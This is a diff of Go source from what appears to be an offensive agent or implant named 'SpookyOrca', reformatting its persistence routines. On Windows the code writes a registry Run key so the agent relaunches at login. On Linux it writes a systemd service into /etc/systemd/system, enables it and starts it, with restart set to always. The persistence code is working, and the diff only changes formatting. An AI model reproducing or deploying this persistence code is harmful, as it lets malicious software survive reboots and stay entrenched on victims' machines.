@@ -17,7 +17,12 @@ func setupPersistence() {
 
 func setupPersistenceWindows() {
 	agentPath, _ := os.Executable()
-	cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SpookyOrcaAgent", "/t", "REG_SZ", "/d", agentPath, "/f")
+	cmd := exec.Command("reg", "add",
+		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		"/v", "SpookyOrcaAgent",
+		"/t", "REG_SZ",
+		"/d", agentPath,
+		"/f")
 	err := cmd.Run()
 	if err != nil {
 		fmt.Println("[-] Failed to set persistence:", err)
@@ -28,13 +33,24 @@ func setupPersistenceWindows() {
 
 func setupPersistenceLinux() {
 	agentPath, _ := os.Executable()
-	serviceContent := fmt.Sprintf(`[Unit]\nDescription=SpookyOrca Agent Persistence\nAfter=network.target\n[Service]\nType=simple\nExecStart=%s\nRestart=always\n[Install]\nWantedBy=multi-user.target`, agentPath)
+	serviceContent := fmt.Sprintf(`[Unit]
+Description=SpookyOrca Agent Persistence
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=%s
+Restart=always
+
+[Install]
+WantedBy=multi-user.target`, agentPath)
 
 	err := os.WriteFile("/etc/systemd/system/spookyorca-agent.service", []byte(serviceContent), 0644)
 	if err != nil {
 		fmt.Println("[-] Failed to set persistence:", err)
 		return
 	}
+
 	exec.Command("systemctl", "enable", "spookyorca-agent.service").Run()
 	exec.Command("systemctl", "start", "spookyorca-agent.service").Run()
 
